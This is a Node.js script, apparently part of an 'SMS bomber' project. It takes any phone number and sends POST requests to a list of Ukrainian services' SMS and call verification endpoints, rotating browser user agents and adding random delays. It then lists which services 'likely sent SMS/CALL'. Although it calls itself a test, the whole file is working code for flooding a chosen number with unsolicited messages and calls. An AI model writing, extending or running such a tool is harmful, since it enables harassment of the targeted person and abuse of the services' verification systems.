import axios from 'axios';
import chalk from 'chalk';
import { allUkrainianServices } from './all-services.js';

const formatPhone = (phone, format) => {
  let p = phone.replace(/\D/g, '');
  if (p.startsWith('0')) p = '380' + p.slice(1);
  if (!p.startsWith('380')) p = '380' + p;
  
  switch(format) {
    case 'formatted1': return `+${p.slice(0,2)}(${p.slice(2,5)})-${p.slice(5,8)}-${p.slice(8,10)}-${p.slice(10)}`;
    case 'formatted3': return `+${p.slice(0,2)} (${p.slice(2,5)}) ${p.slice(5,8)} ${p.slice(8,10)} ${p.slice(10)}`;
    case 'local': return p.slice(3);
    case 'nocode': return p.slice(2);
    default: return p;
  }
};

const prepareBody = (body, phone) => {
  const p = formatPhone(phone);
  return body
    .replace(/{phone}/g, p)
    .replace(/{phoneFormatted1}/g, formatPhone(phone, 'formatted1'))
    .replace(/{phoneFormatted3}/g, formatPhone(phone, 'formatted3'))
    .replace(/{phoneLocal}/g, formatPhone(phone, 'local'))
    .replace(/{phoneNoCode}/g, formatPhone(phone, 'nocode'));
};

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1"
];

async function testService(svc, phone) {
  const body = prepareBody(svc.body, phone);
  const config = {
    method: 'POST',
    url: svc.url,
    headers: {
      'Content-Type': svc.contentType,
      'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
      'Accept': '*/*',
      'Accept-Language': 'uk-UA,uk;q=0.9,en;q=0.8',
      ...(svc.referer && { 'Referer': svc.referer }),
      ...(svc.headers || {})
    },
    data: svc.contentType.includes('json') ? JSON.parse(body) : body,
    timeout: 15000,
    validateStatus: () => true
  };

  try {
    const start = Date.now();
    const res = await axios(config);
    return { name: svc.name, status: res.status, time: Date.now() - start, type: svc.type || 'sms', ok: res.status >= 200 && res.status < 300 };
  } catch (e) {
    return { name: svc.name, status: 0, error: e.message.slice(0, 50), type: svc.type || 'sms', ok: false };
  }
}

async function main() {
  const phone = process.argv[2];
  if (!phone) { console.log('Usage: node test-all.js <phone>'); process.exit(1); }

  console.log(chalk.cyan(`\n${'═'.repeat(60)}`));
  console.log(chalk.yellow.bold('  COMPREHENSIVE SMS BOMBER TEST - ALL UKRAINIAN SERVICES'));
  console.log(chalk.cyan(`${'═'.repeat(60)}\n`));
  console.log(chalk.white(`Phone: +${formatPhone(phone)} | Services: ${allUkrainianServices.length}\n`));

  const results = { success: [], failed: [], error: [] };

  for (let i = 0; i < allUkrainianServices.length; i++) {
    const svc = allUkrainianServices[i];
    process.stdout.write(chalk.gray(`[${String(i+1).padStart(2)}/${allUkrainianServices.length}] ${svc.name.padEnd(20)} `));
    
    const r = await testService(svc, phone);
    
    if (r.ok) {
      console.log(chalk.green(`✓ ${r.status} (${r.time}ms)`));
      results.success.push(r);
    } else if (r.error) {
      console.log(chalk.red(`✗ ${r.error}`));
      results.error.push(r);
    } else {
      console.log(chalk.yellow(`? ${r.status}`));
      results.failed.push(r);
    }
    
    await new Promise(r => setTimeout(r, 300 + Math.random() * 400));
  }

  console.log(chalk.cyan(`\n${'═'.repeat(60)}`));
  console.log(chalk.green(`SUCCESS (likely sent): ${results.success.length}`));
  console.log(chalk.yellow(`FAILED (4xx/5xx): ${results.failed.length}`));  
  console.log(chalk.red(`ERROR (network): ${results.error.length}`));
  
  if (results.success.length > 0) {
    console.log(chalk.cyan(`\n─── SERVICES THAT LIKELY SENT SMS/CALL ───\n`));
    results.success.forEach(r => {
      const icon = r.type === 'call' ? chalk.magenta('☎') : chalk.blue('✉');
      console.log(`${icon} ${chalk.green(r.name)} - ${r.status} (${r.time}ms)`);
    });
  }
  
  console.log(chalk.cyan(`\n${'═'.repeat(60)}\n`));
  console.log(chalk.white('CHECK YOUR PHONE FOR INCOMING SMS AND CALLS!\n'));
  
  // Save results
  const fs = await import('fs');
  fs.writeFileSync('test-results.json', JSON.stringify({ phone, timestamp: new Date().toISOString(), results }, null, 2));
  console.log(chalk.gray('Results saved to test-results.json\n'));
}

main().catch(console.error);
